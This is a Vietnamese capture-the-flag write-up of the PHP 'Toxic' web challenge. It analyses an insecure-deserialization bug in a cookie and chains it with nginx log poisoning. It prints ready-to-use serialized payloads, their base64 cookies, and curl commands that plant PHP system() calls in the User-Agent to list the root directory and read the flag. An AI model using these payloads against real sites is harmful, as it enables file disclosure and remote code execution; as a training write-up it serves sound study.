# `CHALLENGE DESCRIPTION`

<table>
<th style="text-align: center">
<img width="600" height="1">

```
CHALLENGE INFO
```

</th>

<th style="text-align: center">
<img width="350" height="1">

```
TABLE OF CONTENT
```

</th>
<tr>

<td width="600">      

<code> Toxic </code>

Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸

**Tags:** `PHP`, `source-code-analysis`, `insecure-deserialization`, `log-poisioning`

</td>

<td>
<img width="600" height="1">

- [`CHALLENGE DESCRIPTION`](#challenge-description)
- [`QUICK PREVIEW`](#quick-preview)
- [`SOURCE CODE ANALYSIS`](#source-code-analysis)
- [`EXPLOITAION`](#exploitaion)
	- [Log Poisoning](#log-poisoning)
	- [`👽` Get Flag](#-get-flag)
</td>

</tr></table>

# `QUICK PREVIEW`

Đây là một bài White Box, chúng ta được cung cấp source code của Web App.

Sau khi giải nén folder `Toxic.zip`, ta được folder có cấu trúc như sau: 

```shell
Toxic
└── web_toxic
    ├── challenge
	│   ├── models
	│	│   └── PageModel.php
	│   ├── static
	│   │   ├── basement
	│   │   ├── css
	│   │   ├── images
	│   │   └── js
	│   ├── index.html
    │   └── index.php
    ├── config
	│   ├── fpm.conf
	│   ├── nginx.conf
	│   └── supervisord.conf
	├── build-docker.sh
	├── Dockerfile
	├── entrypoint.sh
	└── flag
```

→ Ta có cái nhìn sơ lược về Web App: 
+ Web Tech: `PHP`
+ Server: `nginx` 

Đây là giao diện của trang web

![](../../attachments/Pasted%20image%2020220727042358.png)

→ Mình chưa tìm thấy tính năng gì của trang web cả. → Đọc source code thôi!

# `SOURCE CODE ANALYSIS`
Khi mình đọc được code của file `index.php`, mình biết được sự tồn tại của cookie cũng như cách hình thành nên nó.

App sẽ tạo giá trị của cookie bằng cách thực hiện quá trình `serialize` biến `$page`, sau đó encode bằng thuật toán base64. Đồng thời cũng gán thời gian tồn tại của `cookie` là 86400 giây.

```php
<?php

spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}

$cookie = base64_decode($_COOKIE['PHPSESSID']);

unserialize($cookie);
```

Nhìn kĩ lại biến `$page` là một `object PageModel`, vậy PageModel này là gì ? Tiếp tục nhìn source code, mình phát hiện file `PageModel.php` nằm trong folder `Toxic\web_toxic\challenge\models\` có nội dung như sau:

```php
<?php
class PageModel
{
    public $file;

    public function __destruct()
    {
        include($this->file);
    }
}
```

→ PageModel là một object có 1 property là `$file` và một magic method là `__destruct()` (method này sẽ tự động được gọi khi  1 object PageModel không được sử dụng nữa, cụ thể [here](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct))

Ở đây, app đã bị lỗi `Insecure deserialization`.  Bởi những chuỗi các yếu tố liên kết sau:

+ `Untrusted Data` ( `$_COOKIE['PHPSESSID']` ) rơi vào quá trình `Deserialize`
+ Một `object` có `magic method` thực thi một `sink` nguy hiểm ( `include()` )

# `EXPLOITAION`

Quá trình exploit khá đơn giản (khi chưa bị Object Injection cũng như Gadget Chains).

Đầu tiên, mình sẽ xem hình dạng của cookie trước và sau khi decode base64 như thế nào. Và trông mặt mũi một object khi được seriallize.

![](../../attachments/Pasted%20image%2020220727051536.png)

Sau khi decode base64, cookie của ta có giá trị như sau:

![](../../attachments/Pasted%20image%2020220727051637.png)

Bắt đầu exploit bằng một payload đơn giản, mục đích của payload này là đọc được file /etc/passwd. Và mình sẽ thử modify cookie lại cho đúng syntax của một object sau khi seriallize như sau:

```
O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
```

> Để đảm bảo đúng cấu trúc syntax của một object khi seriallize thì có thể tham khảo thêm [here](https://www.php.net/manual/en/function.serialize.php). 

Tiếp theo thực hiện encode base64 lại object.

```shell
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=
```

Quăng vào cookie của trang web và xem kết quả:

![](../../attachments/Pasted%20image%2020220727052012.png)

→ Ngon. Hoàn toàn đọc được file /etc/passwd của server.

## Log Poisoning

Cũng tương tự, mình sẽ tạo ra 1 payload để có thể đọc được `file log` của server. Để biết file này nằm đâu ta có thể xem cho file `Docker` của src.

```
O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
```

```shell
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
```

Tiếp theo mình sẽ thực hiện gửi một cú request với User-Agent như dưới:

```console
kali@kali:~$ curl -I http://46.101.2.216:30602/ -A "<?php echo 1+1;?>"
HTTP/1.1 200 OK
<--SNIP-->
```

Đây là kết quả

![](../../attachments/Pasted%20image%2020220727053231.png)

Payload đơn giản hoạt động tốt, tiếp đến ta sẽ thực hiện list ra xem thư mục root có những gì

```
kali@kali:~$ curl -I http://46.101.2.216:30602/ -A  "<?php system('ls /');?>"
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 26 Jul 2022 22:06:08 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.4.15
Set-Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9; expires=Wed, 27-Jul-2022 22:06:08 GMT; Max-Age=86400; path=/
```

Kết quả:

![](../../attachments/Pasted%20image%2020220727053501.png)

## `👽` Get Flag 

Tiến hành đọc FLAG thôi

```
kali@kali:~$ curl -I http://46.101.2.216:30602/ -A  "<?php system('cat /flag_Wqi4U');?>"
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 26 Jul 2022 22:06:26 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.4.15
Set-Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9; expires=Wed, 27-Jul-2022 22:06:26 GMT; Max-Age=86400; path=/
```

![](../../attachments/Pasted%20image%2020220727053924.png)


